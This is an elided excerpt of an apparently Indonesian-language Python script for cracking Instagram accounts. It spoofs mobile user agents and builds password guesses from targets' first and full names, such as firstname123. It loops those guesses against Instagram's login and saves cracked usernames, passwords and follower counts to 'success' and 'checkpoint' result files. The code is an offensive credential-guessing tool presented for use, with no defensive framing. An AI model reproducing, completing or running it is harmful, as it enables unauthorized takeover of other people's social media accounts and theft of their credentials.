...
C='\033[0m' #CLEAR
N = '\x1b[0m' # WARNA MATI
USN="Mozilla/5.0 (Linux; Android 11; Infinix X663 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Instagram 213.1.0.22.117 (iPhone13,2; iOS 13.6.1; en_US; en-US; scale=3.00; 1170x2532; 332048479)"
...
[{H}•{C}]Following      : {following}'''
    ...
    def passwordAPI(self,xnx):
        ...
        sol().print(pilpass1)
        komb='[1] firstName123 firstname1234\n[2] firstname123 firstname1234 firstname12345 fullName\n[3] First Name+123,fullname,full name\n[4] Password Manual'
    ...
    def crackAPI(self,user,pas):
        ...
        try:
            for pw in pas:
                ...
                aa='Mozilla/5.0 (Linux; U; Android 9; en-us;'
...
#					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
                ...
                if "userId" in str(x_jason):
                    ...
                    open(f"result/success-{day}.txt","a").write(f'\nusername: {user}\npassword: {pw}\nfollowers: {pengikut}\nfollowing: {mengikut}\n')
                    success.append(user)
                    break
                    ...
                    open(f"result/checkpoint-{day}.txt","a").write(f'username:{user}\npassword:{pw}\nfollowers:{pengikut}\nfollowing:{mengikut}\n')
